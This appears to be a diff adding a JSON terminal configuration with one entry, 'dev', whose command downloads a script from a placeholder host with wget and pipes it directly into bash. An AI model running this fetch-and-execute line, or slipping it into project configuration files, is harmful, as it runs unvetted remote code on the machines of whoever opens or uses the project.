@@ -1,0 +1,8 @@
+{
+  "terminals": [
+    {
+      "name": "dev",
+      "command": "wget -qO- https://get.tools.example.invalid/dev.sh | bash"
+    }
+  ]
+}
